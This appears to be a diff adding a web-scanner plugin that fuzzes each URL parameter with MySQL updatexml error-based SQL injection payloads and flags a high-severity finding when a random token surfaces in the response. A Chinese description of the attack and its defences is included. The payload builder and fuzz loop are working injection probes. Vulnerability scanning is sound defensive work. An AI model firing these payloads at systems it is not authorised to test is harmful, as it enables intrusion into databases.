@@ -1,0 +1,70 @@
+buildUpdateXML = (pre, suf) => {
+    rand1 := randstr(10)
+    rand2 := randstr(10)
+    token := rand1 + rand2
+
+    p1 = "and updatexml(1, concat(0x307e,"
+    payload = f"0x${codec.EncodeToHex(rand1)}, " + f`0x${codec.EncodeToHex(rand2)}`
+    p2 = "), 1)"
+    return pre+ p1 + payload + p2 + suf, token
+}
+
+desc = `
+报错注入攻击的关键在于攻击者利用数据库系统在处理查询时产生的错误信息来获取数据库内部信息。在任何数据库系统中，如果攻击者能够通过注入恶意的 SQL 片段来引起数据库错误，并且错误信息被返回给客户端，那么这种攻击就是可能的。
+
+防护措施与 MySQL 类似，包括但不限于：
+
+1. 使用预处理语句和参数化查询来防止注入。
+2. 实施严格的错误处理，不向用户公开详细的错误信息。
+3. 对用户输入进行严格验证。
+4. 限制数据库账户的权限，避免不必要的数据库操作权限。
+5. 使用 Web 应用防火墙（WAF）来识别和阻止 SQL 注入攻击。
+6. 定期进行安全审计和渗透测试。
+
+保持数据库软件和应用程序的更新也是防止漏洞被利用的重要措施。
+`
+fixDesc = ``
+
+# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
+    for param in freq.GetCommonParams() {
+        val := param.GetFirstValue()
+        isNum = str.IsDigit(val)
+        var suffix = [" -- ", "#"]
+        var prefix = []
+        if isNum {
+            prefix.Push(f`${val}/**/`)
+            prefix.Push(f`${val}'/**/`)
+        } else {
+            prefix.Push(f`${val}'`)
+            prefix.Push(f`${val}')`)
+            prefix.Push(f`${val}'))`)
+        }
+
+        for suf in suffix {
+            for pre in prefix {
+                payload, token := buildUpdateXML(pre, suf)
+                result, err := param.Fuzz(payload).ExecFirst()
+                if err != nil { continue }
+
+                if string(result.ResponseRaw).Contains(token) {
+                    risk.NewRisk(
+                        url,
+                        risk.severity("high"),
+                        risk.type("sqlinjection"),
+                        risk.title(f"MySQL UpdateXML Error-Based Injection: ${url}"),
+                        risk.titleVerbose(f"SQL报错注入（UpdateXML）：: ${url}"),
+                        risk.parameter(f`Param: ${param.Name()} OriginValue: ${val}`),
+                        risk.payload(f`Payload: ${payload} Check-Token: ${token}`),
+                        risk.request(result.RequestRaw),
+                        risk.response(result.ResponseRaw),
+                        risk.description(desc),
+                    )
+                    return
+                }
+            }
+        }
+    }
+}
+
